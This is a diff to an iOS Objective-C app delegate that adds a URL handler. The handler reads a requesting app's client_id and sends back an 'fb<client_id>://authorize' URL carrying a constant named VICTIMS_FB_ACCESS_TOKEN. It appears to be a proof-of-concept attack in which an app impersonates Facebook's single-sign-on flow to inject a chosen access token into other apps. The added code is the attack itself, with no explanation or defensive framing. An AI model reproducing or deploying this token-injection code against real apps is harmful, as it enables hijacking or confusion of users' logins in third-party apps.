@@ -12,12 +12,39 @@
 
 @synthesize window = _window;
 
+
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
 {
     // Override point for customization after application launch.
+    NSLog(@"Launched");
     return YES;
 }
-							
+
+- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation
+{
+    NSLog(@"url: %@", [url absoluteString]);
+    NSArray *pairs = [[url query] componentsSeparatedByString:@"&"];
+	NSMutableDictionary *params = [[NSMutableDictionary alloc] init];
+	for (NSString *pair in pairs) {
+		NSArray *kv = [pair componentsSeparatedByString:@"="];
+		NSString *val =
+        [[kv objectAtIndex:1]
+         stringByReplacingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
+        
+		[params setObject:val forKey:[kv objectAtIndex:0]];
+	};
+    NSString* clientId = [params valueForKey:@"client_id"];
+    NSString* redirectURIString = [NSString stringWithFormat:@"fb%@://authorize?access_token=%@", clientId, VICTIMS_FB_ACCESS_TOKEN];
+    NSURL* redirectURI = [NSURL URLWithString:redirectURIString];
+    if ([[UIApplication sharedApplication] canOpenURL:redirectURI]) {
+        Boolean opended = [[UIApplication sharedApplication] openURL:redirectURI];
+        NSLog(@"opened: %c", opended ? 't' : 'f');
+    } else {
+        NSLog(@"Cannot Open: %@", redirectURIString);
+    }
+    return YES;
+}
+
 - (void)applicationWillResignActive:(UIApplication *)application
 {
     /*
